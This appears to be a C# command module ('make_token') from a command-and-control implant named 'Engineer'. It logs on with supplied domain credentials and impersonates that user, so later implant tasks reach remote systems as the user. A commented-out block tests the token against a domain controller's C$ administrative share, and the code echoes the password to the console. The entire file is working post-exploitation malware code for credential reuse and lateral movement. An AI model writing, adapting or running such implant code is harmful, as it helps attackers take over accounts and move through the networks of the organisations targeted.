﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Engineer.Models;
using Engineer.Extra;

namespace Engineer.Commands
{
    internal class Make_Token : EngineerCommand
    {
        public override string Name => "make_token";

        public override string Execute(EngineerTask task)
        {
            if (task.Arguments.TryGetValue("/username", out string username))
            {
                username = username.TrimStart(' ');
                Console.WriteLine(username);
            }
            if (task.Arguments.TryGetValue("/password", out string password))
            {
                password = password.TrimStart(' ');
                Console.WriteLine(password);
            }
            if (task.Arguments.TryGetValue("/domain", out string domain))
            {
                domain = domain.TrimStart(' ');
                Console.WriteLine(domain);
            }

            if (WinAPIs.Advapi.LogonUser(username, domain, password, WinAPIs.Advapi.LogonType.LOGON32_LOGON_NEW_CREDENTIALS, WinAPIs.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, out IntPtr hToken))
            {
                if (WinAPIs.Advapi.ImpersonateLoggedOnUser(hToken))
                {
                    WindowsIdentity identity = new WindowsIdentity(hToken);
                    try
                    {
                        identity.Impersonate();
                        //perform an ls task against the //dc-02.corp.local/c$ to test token
                        //var ls = new EngineerTask
                        //{
                        //    Id = Guid.NewGuid().ToString(),
                        //    Command = "ls",
                        //    Arguments = new Dictionary<string, string>
                        //    {
                        //        {"/path","//dc-02.corp.local/c$" }
                        //    },
                        //    File = null,
                        //    IsBlocking = false,
                        //};
                        //Program.DealWithTask(ls);
                        Program.ImpersonatedUser = identity;
                        Program.ImpersonatedUserChanged = true;
                        return $"Successfully impersonated {domain}\\{username} for remote access, still {identity.Name} locally";
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine(ex.StackTrace);
                        return (ex.Message);
                    }

                }
                return "error: " + "created token but Failed to imersonate user";
            }
            return "error: " + "Failed to make token";
        }
    }
}
